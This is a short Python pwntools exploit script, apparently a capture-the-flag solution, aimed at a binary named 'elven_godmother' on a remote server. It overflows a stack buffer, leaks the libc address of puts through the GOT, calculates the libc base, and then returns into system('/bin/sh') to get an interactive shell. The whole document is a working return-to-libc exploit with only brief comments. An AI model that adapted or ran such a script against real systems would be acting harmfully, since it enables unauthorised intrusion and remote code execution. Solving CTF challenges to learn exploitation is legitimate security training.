from pwn import *

BIN = './elven_godmother'
# LIBC = '/lib/i386-linux-gnu/libc.so.6'
LIBC = './libc.so.6'
libc = ELF(LIBC)

# p = process(BIN)
p = remote('141.85.224.106', 31344)
elf = ELF(BIN)

main = elf.symbols['main']
padding = 0x10c + 4 + 1  # buff_len + ebp + 1 for the \0 added by the first `fgets`

payload1 = b'a' * padding + p32(elf.symbols['puts']) + p32(main) \
	+ p32(elf.got['puts']) + b'\nm'
p.sendline(payload1)

p.recvuntil(b'(m/f) ')
puts = u32(p.recvline()[:4])
libc.address = puts - libc.symbols['puts']
bin_sh = next(libc.search(b'/bin/sh\x00'))

# Use a valid return address so that `strlen` doesn't seg fault in `libc`.
payload2 = b'a' * padding + p32(libc.symbols['system']) + p32(main) + p32(bin_sh) + b'\nm'
p.sendline(payload2)
p.recvuntil(b'(m/f) ')

p.interactive()
